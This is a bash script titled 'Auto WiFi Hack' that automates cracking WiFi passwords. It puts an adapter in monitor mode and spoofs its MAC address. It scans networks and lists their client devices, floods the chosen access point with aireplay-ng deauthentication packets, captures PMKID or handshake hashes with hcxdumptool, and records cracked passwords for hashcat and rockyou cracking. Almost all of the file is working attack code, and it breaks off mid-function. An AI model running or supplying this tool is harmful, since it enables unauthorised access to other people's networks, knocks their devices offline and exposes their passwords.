#!/bin/bash

version=3.6.5 # 29/5/25 00:10


### Changlog ###
	# Added PMKID attack.


### FIX ###
	# delay between scan to output
	# Close the scan window
	# rebuild wpa2-wpa3
	# Add timer to the pmkid attack


### To Do ###
	# Add Hashcat options for auto configure combinations. + Add possibilities calc. + show the mask better. + option to remove wrong mask.
	# run all networks or range of them at the same time.
	# add more dictioneries than rockyou? or change the default from rockyou - LOOK for better WIFI wordlist
	# specific passwords lists for different vendors
	# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
	# find attacks for WPA3
	# Add clients untill we choose network.
	# Show WPS routers - and add Pixydust attack.



#######################    Instructions    ######################
# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path And OUI file for vendors name of devices and routers (will help identify farther attacks).

# For Alfa AWUS036AXML wifi card:
# 	To enable 6Ghz run: "iw reg set US" and reboot. to check if its enabled run: "iw list".


# **IMPORTANT** if we use GPU with Hashcat:
# 	If there is blank screen after installing the GPU drivers on Kali live persistance -
# 	You need to modify the file "/boot/grub/grub.cfg" from different operation system! (on kali the file will be read only):
# 	Add to the end of the kali live entry the word "nomodeset" like that:
# 		menuentry "Live system with USB persistence  (check kali.org/prst)" {
#			linux /live/vmlinuz-6.8.11-amd64 boot=live persistence components quiet splash noeject findiso=${iso_path} persistence nomodeset
#			initrd /live/initrd.img-6.8.11-amd64
# 		}
# Versions: 
# Hashcat 6.2.6, Aircrack-ng 1.7, hcxtools 6.3.5, MDK4 4.2
#################################################################    











UN=${SUDO_USER:-$(whoami)}
current_date=$(date +"%d_%m_%y")
targets_path="/home/$UN/Desktop/wifi_Targets"
scan_input="$targets_path/Scan/Scan-$current_date.csv"
wordlists_dir="/usr/share/wordlists"
rockyou_file="$wordlists_dir/rockyou.txt"
rockyou_gz="$wordlists_dir/rockyou.txt.gz"
oui_file="$targets_path/oui.txt"
oui_vendor=""


# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo."
  exit 1
fi


# Ensure required directories exist
mkdir -p "$targets_path"
if [ -d "$targets_path/Scan" ]; then
    rm -rf "$targets_path/Scan"
fi
mkdir "$targets_path/Scan"
touch "$targets_path/wifi_passwords.txt"	    
chown -R $UN:$UN $targets_path




# Colors
RED=$'\033[1;31m'
GREEN=$'\033[1;32m'
ORANGE=$'\033[1;33m'
BLUE=$'\033[1;34m'
PURPLE=$'\033[1;35m'
CYAN=$'\033[1;36m'
WHITE=$'\033[1;37m'

NEON_BLACK=$'\033[38;5;8m'
NEON_RED=$'\033[38;5;196m'
NEON_GREEN=$'\033[38;5;82m'
NEON_YELLOW=$'\033[38;5;226m'
NEON_BLUE=$'\033[38;5;21m'
NEON_PURPLE=$'\033[38;5;201m'
NEON_CYAN=$'\033[38;5;51m'
NEON_WHITE=$'\033[38;5;15m'

BOLD=$'\033[1m'
RESET=$'\033[0m'



echo

# Hide cursor
tput civis
trap "tput cnorm; exit" INT TERM

# ASCII banner lines
banner_lines=(
"    █████╗ ██╗   ██╗████████╗ ██████╗     ██╗    ██╗██╗███████╗██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗"
"   ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██║    ██║   ██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝"
"   ███████║██║   ██║   ██║   ██║   ██║    ██║ █╗ ██║██║█████╗  ██║    ███████║███████║██║     █████╔╝ "
"   ██╔══██║██║   ██║   ██║   ██║   ██║    ██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██║██║     ██╔═██╗ "
"   ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗"
"   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
)

# Print each line in red
for line in "${banner_lines[@]}"; do
    echo -e "${NEON_GREEN}${line}${RESET}"
done

echo -e "${ORANGE}   ⚡ v$version ${RESET}"

# Show cursor
tput cnorm
echo -e "\n\n"






function first_setup() {
    echo -e "\n\n${BLUE}[*] Checking and installing required packages:${RESET}\n"

    mandatory_packages=("aircrack-ng" "gnome-terminal" "hashcat" "hcxtools" "gawk" "dbus-x11")
    optional_packages=("wget" "macchanger" "mdk4")
    failed_mandatory=()
    failed_optional=()

    check_install() {
        local package="$1"
        if ! dpkg -l | grep -q "^ii  $package "; then
            echo -e "${ORANGE}[!]${RESET} $package not found. Installing..."
            apt-get update -y >/dev/null  2>&1
            if apt-get install -y "$package" >/dev/null  2>&1; then
                echo -e "${NEON_GREEN}    [✔]${RESET} $package installed successfully."
                return 0
            else
                echo -e "${RED}    [✘] Failed to install $package.${RESET}"
                return 1
            fi
        else
            echo -e "${NEON_GREEN}    [✔]${RESET} $package already installed."
            return 0
        fi
    }

    for package in "${mandatory_packages[@]}"; do
        if ! check_install "$package"; then
            failed_mandatory+=("$package")
        fi
    done

    for package in "${optional_packages[@]}"; do
        if ! check_install "$package"; then
            failed_optional+=("$package")
        fi
    done

    if [ "${#failed_mandatory[@]}" -ne 0 ]; then
        echo -e "\n${RED}    [✘]${RESET} The following mandatory packages failed to install:"
        for pkg in "${failed_mandatory[@]}"; do
            echo "   - $pkg"
        done
        echo -e "\nPlease install them manually before running the script again.\n"
        exit 1
    fi

    if [ "${#failed_optional[@]}" -ne 0 ]; then
        echo -e "\n${ORANGE}    [!]${RESET} The following optional packages failed to install:"
        for pkg in "${failed_optional[@]}"; do
            echo "   - $pkg"
        done
        echo -e "The script will continue, but some features may not work as expected.\n"
    fi
    

    echo -e "\n\n\n\n${BLUE}[*] Verifying wordlists and vendor data:${RESET}\n"

    if [ ! -d "$wordlists_dir" ]; then
        mkdir -p "$wordlists_dir"
        echo -e "${ORANGE}    [+]${RESET} Wordlist directory created at $wordlists_dir"
    fi

    if [ -f "$rockyou_file" ]; then
        echo -e "${NEON_GREEN}    [✔]${RESET} Found rockyou.txt wordlist."
    else
        if [ -f "$rockyou_gz" ]; then
            gzip -d "$rockyou_gz"
            echo -e "${NEON_GREEN}    [✔]${RESET} Unzipped rockyou.txt."
        else
            echo -e "${ORANGE}    [+]${RESET} Downloading rockyou.txt..."
            wget -q -P "$wordlists_dir" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
            if [ -f "$rockyou_file" ]; then
                echo -e "${NEON_GREEN}    [✔]${RESET} rockyou.txt downloaded."
            else
                echo -e "${RED}    [✘]${RESET} Failed to download rockyou.txt."
            fi
        fi
    fi

    if [ -f "$oui_file" ]; then
        echo -e "${NEON_GREEN}    [✔]${RESET} Found OUI vendor file."
    else
        echo -e "${ORANGE}    [+]${RESET} Downloading OUI vendor file..."
        wget -q https://raw.githubusercontent.com/idoCo10/OUI-list-2025/main/oui.txt -O "$targets_path"/oui.txt
        if [ -f "$oui_file" ]; then
            echo -e "${NEON_GREEN}    [✔]${RESET} OUI vendor file downloaded."
        else
            echo -e "${RED}    [✘]${RESET} Failed to download OUI vendor file."
        fi
    fi
    echo -e "\n"
}



function enable_gpu() {
    echo -e "\n\n${BLUE}[*] Getting GPU details:${RESET}\n"
    # Check if running in a VM
    if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
        echo -e "${NEON_YELLOW}${BOLD}    [⚠]${RESET} You are running inside a VM. ${RED}GPU is not available.${RESET}\n\n"
        return 1
    fi
    # Detect GPU
    GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')

    if [[ -z "$GPU_INFO" ]]; then
        echo -e "\n${RED}    [✘]${RESET} ${RED}No NVIDIA GPU detected. Skipping GPU setup.${RESET}\n"
        return 1
    fi
    # Extract GPU model
    GPU_MODEL=$(echo "$GPU_INFO" | sed -E 's/.*\[(GeForce [^]]+)\].*/\1/')
    echo -e "${NEON_GREEN}    [✔]${RESET} GPU detected: ${ORANGE}NVIDIA $GPU_MODEL${RESET}"

    # Check for CUDA
    if command -v nvidia-smi &>/dev/null; then
        CUDA_VERSION=$(nvidia-smi | grep -i "CUDA Version" | awk '{print $6}')
        echo -e "${NEON_GREEN}    [✔]${RESET} CUDA is installed. Version: ${BLUE}$CUDA_VERSION${RESET}"
    else
        echo -e "\n${ORANGE}    [!]${RESET} CUDA is not detected."
        read -p "Would you like to install CUDA? (Y/n): " response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            echo -e "\n    [~] Installing NVIDIA CUDA drivers..."
	    packages=("linux-headers-amd64" "nvidia-driver" "nvidia-cuda-toolkit")
	    for package in "${packages[@]}"; do
		    if ! dpkg -l | grep -q "^ii  $package "; then
		        echo -e "\n    [~] Installing $package..."
		        apt install -y "$package"
		    else
		        echo -e "${NEON_GREEN}    [✔]${RESET} $package is already installed."
		    fi
	    done                        
            echo -e "\n${ORANGE}    [!]${RESET} ${ORANGE}Please reboot your system for changes to take effect.${RESET}"
            return 0
        else
            echo -e "\n${ORANGE}    [!]${RESET} Skipping CUDA installation. GPU will not be used."
            return 1
        fi
    fi
    # Check if Hashcat detects the GPU
    HASHCAT_INFO=$(hashcat -I | grep GPU 2>/dev/null)
    if [[ -n "$HASHCAT_INFO" ]]; then
        echo -e "${NEON_GREEN}    [✔]${RESET} Great! Hashcat detects the GPU and will use it to crack the passwords.\n\n"
        return 0
    else
        echo -e "\n${RED}    [✘]${RESET} Hashcat does not detect the GPU."
        echo -e "${ORANGE}    [!]${RESET} Possible reasons:\n   - Missing NVIDIA drivers\n   - OpenCL not installed\n   - CUDA not properly configured"
        echo -e "\n${ORANGE}    [!]${RESET} Skipping GPU setup."
    fi
}



function adapter_config() {
    echo -e "\n\n${BLUE}[*] Detecting WiFi adapters:${RESET}\n"
    airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes

    # Get all WiFi interfaces
    adapters=($(iw dev | awk '$1=="Interface"{print $2}'))

    if [[ ${#adapters[@]} -eq 0 ]]; then
        echo -e "${RED}    [✘] No WiFi adapters detected.${RESET}\n"
        read -p "    Enter your WiFi adapter name: " manual_adapter
        if [[ -z "$manual_adapter" ]]; then
            echo -e "${RED}    [✘] No input provided. Exiting.${RESET}"
            exit 1
        fi
        wifi_adapter="$manual_adapter"

    elif [[ ${#adapters[@]} -eq 1 ]]; then
        wifi_adapter="${adapters[0]}"
        echo -e "${NEON_GREEN}    [✔]${RESET} WiFi adapter detected: ${BOLD}$wifi_adapter${RESET}"
    
    else
        # Display the adapter list with vendor names
        for i in "${!adapters[@]}"; do
            adapter="${adapters[$i]}"

            if [[ "$adapter" == *"mon" ]]; then
                # Get permanent MAC for monitor-mode adapter
                perm_mac=$(macchanger -s "$adapter" 2>/dev/null | awk -F': ' '/Permanent MAC:/ {print $2}' | cut -d' ' -f1 | tr '[:lower:]' '[:upper:]')
                mac_addr="$perm_mac"
            else
                # Use current MAC for normal mode adapter
                mac_addr=$(cat /sys/class/net/$adapter/address 2>/dev/null | tr '[:lower:]' '[:upper:]')
            fi

            vendor=$(get_oui_vendor "$mac_addr")
            [[ -z "$vendor" ]] && vendor="unkon"

            printf "    %d) %-12s (%s)\n" "$((i + 1))" "$adapter" "$vendor"
        done
        echo

        while true; do
            read -p "    Select an adapter: " input

            # If numeric and valid index
            if [[ "$input" =~ ^[0-9]+$ ]] && (( input >= 1 && input <= ${#adapters[@]} )); then
                wifi_adapter="${adapters[$((input - 1))]}"
                break
            # If matches adapter name directly
            elif [[ " ${adapters[*]} " =~ " $input " ]]; then
                wifi_adapter="$input"
                break
            else
                echo -e "${RED}    [✘] Invalid input.${RESET} Please enter a valid number or adapter name.\n"
            fi
        done
    fi

    # If already in monitor mode, skip enabling it again
    if [[ "$wifi_adapter" == *"mon" ]]; then
        echo -e "${NEON_GREEN}    [✔]${RESET} Adapter is already in monitor mode.\n\n"
        return 0
    fi

    airmon-ng start "$wifi_adapter" > /dev/null 2>&1

    # Look for the new monitor mode adapter
    mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}' | grep "^${wifi_adapter}mon$")

    if [[ -n "$mon_adapter" ]]; then
        echo -e "${NEON_GREEN}    [✔]${RESET} Successfully switched $wifi_adapter to monitor mode.\n\n"
        wifi_adapter=$mon_adapter        
    else
        echo -e "${RED}    [✘] Failed to start $wifi_adapter in monitor mode.${RESET} Check your adapter and try again.\n\n"
        exit 1
    fi
}



function spoof_adapter_mac() {
    echo -e "\n\n${BLUE}[*] Randomizing WiFi adapter MAC address:${RESET}\n"

    # Bring interface down
    ifconfig ${wifi_adapter} down

    # Get permanent MAC + vendor
    perm_output=$(macchanger -p ${wifi_adapter} 2>/dev/null)
    perm_mac=$(echo "$perm_output" | awk -F': ' '/Permanent MAC:/ {print $2}' | cut -d' ' -f1 | tr '[:lower:]' '[:upper:]')
    perm_vendor=$(get_oui_vendor "$perm_mac")
    [[ -z "$perm_vendor" ]] && perm_vendor="unknown"

    # Randomize MAC
    rand_output=$(macchanger -r ${wifi_adapter} 2>/dev/null)
    rand_mac=$(echo "$rand_output" | awk -F': ' '/New MAC:/ {print $2}' | cut -d' ' -f1 | tr '[:lower:]' '[:upper:]')
    rand_vendor=$(get_oui_vendor "$rand_mac")
    [[ -z "$rand_vendor" ]] && rand_vendor="unknown"

    # Bring interface up
    ifconfig ${wifi_adapter} up

    # Fallback if parsing failed
    if [ -z "$rand_mac" ]; then
        rand_mac=$(ip link show ${wifi_adapter} | awk '/link\/ieee802.11/ {print $2}' | tr '[:lower:]' '[:upper:]')
        rand_vendor=$(get_oui_vendor "$rand_mac")
        [[ -z "$rand_vendor" ]] && rand_vendor="unknown"
    fi

    # Output
    echo -e "    ${ORANGE}[🔓]${RESET} Permanent MAC:  $perm_mac        ($perm_vendor)"
    echo -e "${NEON_GREEN}    [✔]${RESET}  Randomized MAC: $rand_mac        ($rand_vendor)"
}



function network_scanner() {	
        # Scan 15 seconds for wifi networks   
        countdown_duration=3
        gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter} --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        

        echo -e "\n\n\n\n${BLUE}[*] Scanning available WiFi Networks ($countdown_duration s):${RESET}"
        for (( i=$countdown_duration; i>=1; i-- )); do
            tput cuu1 && tput el
            echo -e "${BLUE}[*] Scanning for available WiFi Networks:${RED} $i ${RESET}"
            sleep 1
        done
        mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
        cp "$scan_input" "$scan_input.original"
        
	# Extract client MAC and associated BSSID from the original scan without displaying them
	clients_content=$(awk -F, '/Station MAC/ {flag=1; next} flag && $1 ~ /:/ {client_mac=$1; bssid=$6; if (bssid !~ /(not associated)/) printf "%-22s %s\n", client_mac, bssid}' "$scan_input.original")
        
        # Fix WPA3 shown as WPA3-WPA2
	awk -F',' 'BEGIN { OFS="," }
	{
	    if ($6 ~ /^[[:space:]]*WPA3 WPA2[[:space:]]*$/ && $8 ~ /^[[:space:]]*SAE[[:space:]]*$/) {
		sub(/WPA3 WPA2/, "WPA3", $6)
	    }
	    print
	}' "$scan_input.original" > "$scan_input.cleaned"


	# Edit original scan file to a more organized format
	awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $9, $14}' "$scan_input.cleaned" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Extract relevant fields
	awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"           # Delete the clients part
	awk -F',' '$NF ~ /\S/' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                # Delete networks without names
	tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the header
	head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the footer
	awk -F, '{ gsub(/^ */, "", $0); gsub(/ *$/, "", $0); print $0 }' "$scan_input" | sort -t, -k4,4nr -k5 > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Sort by power and name

	# Append the client information to the end of the scan file
	echo -e "\nStation MAC:            BSSID:\n$clients_content" >> "$scan_input"

	# Display available WiFi networks
	echo -e "\n${ORANGE}Available WiFi Networks:${RESET}\n"

	# Display the scan input file contents with row numbers
	printf "${BOLD}      Name: %-30s Clients: %-1s Encryption: %-1s Channel: %-1s Power: %-1s Signal: %-0s BSSID: %-13s Vendor: %-1s${RESET}\n"
	echo "--------------------------------------------------------------------------------------------------------------------------------------------------"

	declare -A client_counts
	while IFS= read -r client_line; do
	    bssid=$(echo "$client_line" | awk '{print $2}')
	    # Ensure bssid is not empty before incrementing
	    if [[ -n "$bssid" ]]; then
		((client_counts["$bssid"]++))
	    fi
	done <<< "$clients_content"

	# Process and display only the WiFi network section (exclude the Station MAC section)
	awk '/^Station MAC/ {exit} {print}' "$scan_input" | nl -w2 -s', ' | awk -F', ' '{print $0}' | while read -r line; do
	    # Skip empty lines
	    if [[ -z "$line" ]]; then
		continue
	    fi
	    index=$(echo "$line" | cut -d',' -f1 | xargs)
	    mac=$(echo "$line" | cut -d',' -f2 | xargs)
	    channel=$(echo "$line" | cut -d',' -f3 | xargs)
	    encryption=$(echo "$line" | cut -d',' -f4 | xargs)
	    power=$(echo "$line" | cut -d',' -f5 | xargs)
	    ssid=$(echo "$line" | cut -d',' -f6 | tr -d '|')  # remove "|" from SSID name

	    # Get the vendor dynamically
	    vendor=$(get_oui_vendor "$mac")
	    # Get the number of clients for this BSSID
	    client_count=${client_counts["$mac"]}
	    clients_display=""
	    if [[ -n "$client_count" ]]; then
		clients_display="+$client_count"
	    fi
	      
	    # Convert dBm power values into signal bars representation
	    signal_strength=$power  # Assuming power is in dBm (negative values)
    	    if (( signal_strength >= -60 )); then
	        bars="${GREEN}▂▄▆█${RESET}"  # Excellent
	    elif (( signal_strength >= -70 )); then
	        bars="${ORANGE}▂▄▆_${RESET}"  # Good 
	    elif (( signal_strength >= -80 )); then
	        bars="${PURPLE}▂▄__${RESET}"  # Fair
	    elif (( signal_strength >= -90 )); then
	        bars="${CYAN}▂___${RESET}"  # Weak 
	    else
	        bars="${RED}____${RESET}"  # Very Weak 
	    fi

	    # Colorize encryption type using if-elif, replacing with colorized label
	    temp_encryption=$encryption

	    if [[ "$temp_encryption" == "WPA3" ]]; then
	        encryption_color="${RED}WPA3${RESET}"  
	    elif [[ "$temp_encryption" == "WPA3 WPA2" || "$temp_encryption" == "WPA2 WPA3" ]]; then
	        encryption_color="\033[91mWPA3 WPA2${RESET}" 
	    elif [[ "$temp_encryption" == "WPA2" ]]; then
	        encryption_color="\033[93mWPA2${RESET}"  
	    elif [[ "$temp_encryption" == "WPA2 WPA" || "$temp_encryption" == "WPA WPA2" ]]; then
	        encryption_color="\033[96mWPA2 WPA${RESET}"  
	    elif [[ "$temp_encryption" == "WPA" ]]; then
	        encryption_color="${CYAN}WPA${RESET}" 	        
	    elif [[ "$temp_encryption" == "OPN" || "$temp_encryption" == "Open" ]]; then
	        encryption_color="\033[92mOPEN${RESET}" 
	    else
	        encryption_color="$temp_encryption"  # Default color
	    fi


	    # Use printf to format the fields and pipe into column for proper alignment
	    if [[ -n "$vendor" ]]; then
		printf "%-4s %-35s | %-7s | %-10b | %-7s | %-5s | %-5b | %-17s | %-1s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption_color" "$channel" "$power" "$bars" "$mac" "$vendor"
	    else
		printf "%-4s %-35s | %-7s | %-10b | %-7s | %-5s | %-5b | %-17s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption_color" "$channel" "$power" "$bars" "$mac"
	    fi
	done | column -t -s "|"
	echo
        
        num_rows=$(awk '/Station MAC/ {exit} NF {count++} END {print count}' "$scan_input") # Calculate the number of valid rows (above the empty line before "Station MAC")
		    	    
        choose_network
}



function choose_network() {
    while :; do
        # Prompt the user to choose a row number
        read -p "Enter row number: " row_number
        echo
        # Keep asking for a valid row number
        while :; do
            re='^[0-9]+$'
            if ! [[ $row_number =~ $re ]]; then
                echo -e "${RED}\nError:${RESET} Not a valid number."
            elif (( row_number < 1 || row_number > num_rows )); then
                echo -e "\n${RED}    [✘] Error:${RESET} Row number out of range."
            else
                break
            fi
            echo
            read -p "Enter row number: " row_number
            echo -e "\n\n"
        done

        # Extracting values from airodump-ng scan file
        chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
        bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
        channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
        encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
        power=$(echo "$chosen_row" | awk -F', ' '{print $4}')
        bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $5}')
        bssid_name_original=${bssid_name}

        # Remove "/" from bssid name
        if [[ $bssid_name == *"/"* ]]; then
            bssid_name=${bssid_name//\//}
        fi

        oui_vendor=$(get_oui_vendor)

        # Echo values
        echo -e "\n${ORANGE}BSSID Name:${RESET} $bssid_name_original"
        if [[ -n "$oui_vendor" ]]; then
            echo -e "${ORANGE}MAC Address:${RESET} $bssid_address - $oui_vendor"
        else
            echo -e "${ORANGE}MAC Address:${RESET} $bssid_address"
        fi

        if [ "$encryption" = "OPN" ]; then
            echo -e "${ORANGE}Encryption:${RESET} none"
        else
            echo -e "${ORANGE}Encryption:${RESET} $encryption"
        fi
        echo -e "${ORANGE}Channel:${RESET} $channel"
        echo -e "${ORANGE}Power:${RESET} $power"        
        echo -e "\n"

        if [ "$encryption" = "OPN" ]; then
            echo -e "${NEON_GREEN}    [✔]${RESET} The Network is open."
            echo -e "        Choose different Network.\n"
            continue  
        elif [[ "$encryption" == "WPA3" ]]; then
            echo -e "${RED}    [✘]${RESET} ${BOLD}The Encryption is "$encryption". This script can't crack it yet.${RESET}"
            echo -e "Choose different Network.\n"
            continue           
        elif [[ "$encryption" == "WEP" ]]; then
	    crack_wep
            continue                    
        fi

        # Check if we already have the WiFi password for this BSSID
        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The WiFi password is:"; then
            wifi_password=$(grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The WiFi password is:" | awk -F': ' '{print $2}' | xargs)
            echo -e "${GREEN}Password already exists for this network!${RESET}"
            echo -e "${BLUE}The WiFi password is:${RESET} ${ORANGE}$wifi_password${RESET}\n"
            echo -e "Choose different Network.\n"
            continue 
        fi

        # Check if this BSSID was previously marked as failed with Rockyou wordlist   
        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not cracked with Rockyou wordlist"; then
            echo -e "${BLUE}Password for $bssid_name (BSSID: $bssid_address)${RESET} was already checked and ${RED}not found in Rockyou wordlist.${RESET}\n" 
            echo -e "Choose different Attack..\n"
            choose_attack
        fi

        # If we only captured the handshake from previous scan
        if [ -d "$targets_path/$bssid_name" ]; then
            if grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
                echo -e "${NEON_GREEN}    [✔]${RESET} ${GREEN}Handshake found from previous scan.${RESET}\n"
                pkill aireplay-ng
                pkill airodump-ng
                cleanup
                choose_attack
                exit 1   
            else
                rm -r $targets_path/"$bssid_name" 
                mkdir $targets_path/"$bssid_name"           
            fi   
        else
            mkdir $targets_path/"$bssid_name"           
        fi

        validate_network
        
        break  
    done
}



function validate_network() {
    echo -e "${BLUE}[*] Validating network:${RESET}"
    
    # Open airodump-ng in a hidden terminal
    gnome-terminal --geometry=105x15-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter" "$targets_path/$bssid_name/airodump_output.txt"

    found=0
    echo -en "    ${BOLD}[⏳]${RESET} Checking.."
    
    for (( i=0; i<20; i++ )); do
        if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
            found=1
            echo -e "\n${NEON_GREEN}    [✔]${RESET} Network available!\n"
            break
        fi
        echo -n "."  # Show progress dots
        sleep 1
    done

    echo ""  # New line after dots

    if [ $found -eq 0 ]; then
        pkill aireplay-ng
        pkill airodump-ng
        echo -e "${RED}    [✘]${RESET} Network appears to be offline now."
        another_scan_prompt
    fi
}



function get_oui_vendor() {
    local mac="$1"
    # If no argument is provided, use the global variable bssid_address
    if [[ -z "$mac" ]]; then
        mac="$bssid_address"
    fi
    local oui=$(echo "$mac" | awk -F':' '{print toupper($1 ":" $2 ":" $3)}') # Extract OUI in uppercase
    if [[ -f $oui_file ]]; then
        local vendor=$(grep -i "^$oui" "$oui_file" | awk '{$1=""; print $0}' | xargs | tr -d '\r')
        echo "$vendor"
    else
        echo ""
    fi
}



function devices_scanner() {
    seen_macs=()
    devices_header_shown=false
    while true; do
        target_devices=$(grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")

        if [ -n "$target_devices" ]; then
            while IFS= read -r mac; do
                if [[ -n "$mac" && ! " ${seen_macs[*]} " =~ " $mac " ]]; then
                    vendor=$(get_oui_vendor "$mac")

                    # Skip "Private" devices before adding to seen_macs
                    if [[ "$vendor" == "Private" ]]; then
                        continue
                    fi

                    seen_macs+=("$mac")

                    if [ "$devices_header_shown" = false ]; then
                        echo -e "\n\n    ${NEON_CYAN}Devices Found:${RESET}"
                        devices_header_shown=true
                    fi

                    # Print new device
                    if [[ -n "$vendor" ]]; then
                        echo -e "    📍 $mac - $vendor"
                    else
                        echo -e "    📍 $mac"
                    fi
                fi
            done <<< "$(echo "$target_devices" | tr ' ' '\n')"
        fi
        sleep 0.5
    done
}





function deauth_attack() {
    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"
}



function attacks() {
    pcapng_file="$targets_path/$bssid_name/hcxdump.pcapng"
    hash_file="$targets_path/$bssid_name/hash.hc22000"

    # Create BPF filter
    hcxdumptool --bpfc="wlan addr3 $bssid_address" > "$targets_path/$bssid_name/filter.bpf"

    # Determine the band suffix based on channel number
    if [[ "$channel" -ge 1 && "$channel" -le 14 ]]; then
        band="a"
    elif [[ "$channel" -ge 36 && "$channel" -le 165 ]]; then
        band="b"
    elif [[ "$channel" -ge 191 && "$channel" -le 233 ]]; then
        band="c"
    elif [[ "$channel" -ge 1 && "$channel" -le 9 ]]; then
        band="e"
    else
        band=""
    fi

    echo -e "\n${RED}->> Starting Attacks:${RESET}"      

    
    #echo -e "\n     ${RED}[->] Capturing 4-way handshake${RESET}"
    #echo -e "\n     ${RED}[->] Testing for Rogue AP/Misassociation${RESET}"
    
    
	animate_attack() {
	    local message="$1"
	    local dots=$2
	    echo -ne "    ${NEON_RED}[->] $message${RESET}"
	    for ((i=1; i<=dots; i++)); do
		echo -ne "."
		sleep 0.02
	    done
	    echo -e "    ${NEON_GREEN}✔${RESET}"
	}
	animate_attack "PMKID attack" 30
	animate_attack "Deauthentication attack" 19
	animate_attack "Disassociation attack" 21
	animate_attack "Authentication Denial attack" 14
	animate_attack "Beacon Flooding attack" 20
	animate_attack "Probe Request/Response attack" 13





    # Start device scanner in background
    devices_scanner &
    scanner_pid=$!

    # Start hcxdumptool in hidden terminal
    if [[ -n "$band" ]]; then
        channel_with_band="${channel}${band}"
        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}' -c '$channel_with_band' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
    else
        echo "Warning: Unknown channel ($channel), running without -c"
        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
    fi

    sleep 2
    terminal_pid=$(pgrep gnome-terminal)

    counter=0
    max_tries=24  # 24 * 5s = 120 seconds

    while (( counter < max_tries )); do
        hcxpcapngtool -o "$hash_file" "$pcapng_file" &>/dev/null
        deauth_attack
        if [[ -s "$hash_file" ]]; then       
            sta_mac=$(grep -m1 '^WPA\*0[12]\*' "$hash_file" | cut -d'*' -f5 | sed 's/../&:/g; s/:$//' | tr 'a-f' 'A-F')
            sleep 3

            if grep -q '^WPA\*01\*' "$hash_file"; then
		echo -e "\n\n${NEON_GREEN}${BOLD}->> Got the PMKID!  ${RESET}(from: $sta_mac)\n"
                break
            elif grep -q '^WPA\*02\*' "$hash_file"; then
                echo -e "\n\n${NEON_GREEN}${BOLD}->> Got the EAPOL handshake!  ${RESET}(from: $sta_mac)\n"
                break
            fi
        fi

        sleep 5
        ((counter++))
    done

    # Kill scanner and hcxdumptool terminal
    kill "$scanner_pid" &>/dev/null
    kill "$terminal_pid" &>/dev/null
    pkill aireplay-ng
    pkill airodump-ng

    if (( counter == max_tries )); then
        echo -e "\n${RED}    [✘]${RESET} \033[31mTimeout:${RESET} No PMKID or EAPOL captured in 120 seconds."
        another_scan_prompt
        return
    fi
    echo --- >> "$targets_path/wifi_passwords.txt"
    printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
}



function mixed_encryption() {
    echo -e "${BOLD}The Encryption is "$encryption".${RESET} \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
